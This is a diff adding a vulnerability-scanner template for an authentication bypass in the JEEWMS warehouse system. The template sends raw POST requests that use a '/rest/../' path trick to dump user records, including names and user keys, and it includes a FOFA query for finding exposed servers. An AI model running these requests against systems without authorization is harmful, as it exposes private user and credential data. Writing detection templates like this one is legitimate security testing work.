@@ -1,0 +1,36 @@
+id: jeewms-unauth
+
+info:
+  name: JEEWMS - unauth
+  author: leadlife
+  severity: high
+  description: JEEWMS is vulnerable to a privilege bypass via its AuthInterceptor, allowing unauthorized actions.
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/683fcc3ae70e18cb30eadf3ec16982d18f04444f/bugs/JEEWMS_%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  metadata:
+    verified: true
+    fofa-query: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
+    tips:
+  tags: unauth,jeewms
+
+http:
+  - raw:
+      - |
+        POST /rest/../userController.do?datagrid&field=id,userName,realName,userOrgList.tsDepart.departname,userKey,createBy,createDate,updateBy,updateDate,status, HTTP/1.1
+        Host: {{Hostname}}
+
+        page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
+      
+      - |
+        POST /wmstest/rest/../userController.do?datagrid&field=id,userName,realName,userOrgList.tsDepart.departname,userKey,createBy,createDate,updateBy,updateDate,status, HTTP/1.1
+        Host: {{Hostname}}
+
+        page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'userName','realName','createBy')
+        condition: and
